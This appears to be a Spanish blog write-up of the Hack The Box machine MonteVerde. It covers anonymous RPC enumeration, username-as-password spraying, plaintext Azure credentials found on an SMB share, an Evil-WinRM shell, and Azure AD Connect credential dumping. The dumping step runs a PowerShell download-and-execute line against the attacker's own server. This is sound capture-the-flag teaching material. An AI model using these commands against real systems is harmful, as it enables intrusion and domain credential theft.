---
layout: post
title: MonteVerde
date: 2022-11-18
categories: ["HTB", "RPC", "SMB", "Azure"]
thumbnail: "assets/images/MonteVerde.png"
---

# MonteVerde [ Hack The Box ]

### Reconocimiento

#### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 10.10.10.172 -oG allPorts`
```
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.10.172 -oN targeted
```

Vemos que está el puerto `5985` abierto, pertenece a `WinRM`, pero no tenemos credenciales.

### RPC

Como vemos no hay ningún puerto de servidor web, así que nos tenemos que apañar con l que tenemos, en este caso vemos el puerto `139` abierto, pero cuando tratamos de listar el contenido nos deniega el acceso.

Como tampoco podemos listar el puerto `445` vamos a tratar de conseguir una sesión `RPC` sin credenciales, así que hacemos lo siguiente:

- `rpcclient -U "" -N 10.10.10.172`

Bien! Vemos que obtenemos una conexión! Vamos a desplegar información con el comando
`querydispinfo`. Vemos muchos números, pero también varios nombres de usuario con su respectivo nombre.

```
[...] Account: AAD_987d7f2f57d2 [...]
[...] Account: dgalanos [...]
[...] Account: Guest [...]
[...] Account: mhope [...]
[...] Account: roleary [...]
[...] Account: SABatchJobs [...]
[...] Account: smorgan [...]
[...] Account: svc-ata [...]
[...] Account: svc-bexec [...]
[...] Account: svc-netapp [...]
```

Vamos a copiar todos los nombres de usuario en un archivo, en mi caso llamado `users`. Una vez tenemos el archivo podemos utilizar `CrackMapEXEC` para hacer fuerza bruta. Como sólo tenemos los nombres de usuario y queremos probar algo rápido antes que algo exhaustivo vamos a probar utilizando el nombre de usuario como contraseña.

```
crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success
```

```
[...]
SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
[...]
```

Bien! Hemos obtenido la contraseña de `SABatchJobs` (`SABatchJobs:SABatchJobs`) para `SMB`!

### Shell

Bien, como ya disponemos de credenciales válidas vamos a listar de nuevo `SMB`, pero utilizando las credenciales encontradas. En mi caso utilizaré `SMBMap` ya que directamente me dice qué directorios puedo leer, modificar o no tener acceso.

- `smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJob`

```
[+] IP: 10.10.10.172:445 Name: 10.10.10.
Disk            Permissions       Comment
----            -----------       -------
ADMIN$          NO ACCESS         Remote Admin
azure_uploads   READ ONLY
C$              NO ACCESS         Default share
E$              NO ACCESS         Default share
PC$             READ ONLY         Remote IPC
NETLOGON        READ ONLY         Logon server share
SYSVOL          READ ONLY         Logon server share
users$          READ ONLY
```

Vemos un directorio que nos llama la atención llamado `users$` el cual podemos leer, vamos a ver qué tiene.

- `smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs`

```
smb> get mhope/azure.xml
```

Bien! Tenemos un archivo XML! Vamos a ver qué contiene!

```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
<Obj RefId="0">
<TN RefId="0">
<T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
<T>System.Object</T>
</TN>

<ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
<Props>
<DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
<DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
<G N="KeyId">00000000-0000-0000-0000-000000000000</G>
<S N="Password">4n0therD4y@n0th3r$</S>
</Props>
</Obj>
</Objs>
```

Wow! Vemos la contraseña de Azure en texto claro! Ahora para acceder y obtener una Shell vamos a utilizar `WinRM` ya que vimos que el puerto `5985` está abierto.

- `evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`

```
Info: Starting Evil-WinRM shell v1.

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents>

```

Bien! Ya estamos en la máquina como `mhope`!

### Subida de privilegios

Ahora que ya estamos en la máquina tenemos que tratar de ser administradores, así que
comenzé por enumeración básica, por lo que miraré en los grupos que se encuentra `mhope`.

```
*Evil-WinRM* PS C:\> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               \\monteverde\users$\mhope
Last logon                   1/18/2020 11:05:46 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users         
The command completed successfully.
```

Vemos que se encuentra en el grupo `Azure Admins`, así que después de estar mirando un poco llegué al directorio `C:\Program Files`, donde vemos varias carpetas con el nombre de `Azure`, con `*` podemos filtrar por la cadena que queramos.

```
*Evil-WinRM* PS C:\Program Files> ls *Azure*

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

Investigando un poco llegamos a un artículo de [`XPN`](https://blog.xpnsec.com/azuread-connect-for-redteam/). El artículo habla de cómo
explotar `Azure Connect`.

Vemos que `mhope` es capaz de conectarse a la base de datos local (ya que es administrador) y extraer la configuración, después de eso podemos decodearlo y obtener el nombre de usuario y contraseña en texto claro de la cuenta que ha manejado la réplica.

Traté de utilizar el `script` del artículo, pero tenemos que cambiar la variable `client` para hacer que conecte con la `DB`.

```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
```

Una vez tenemos todo listo podemos montarnos un servidor en Python para pasarle el
archivo PS1 y hacer que lo corra, para eso haremos lo siguiente:

- `python3 -m http.server 80`

```
*Evil-WinRM* PS C:\Program Files> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
Bien! Ya tenemos la contraseña de `administrator` (`administrator:d0m@in4dminyeah!`)! Ahora podemos hacer como antes y con `Evil-WinRM` conectarnos como `administrator`.

Enhorabuena! Ya somos administradores de la máquina!
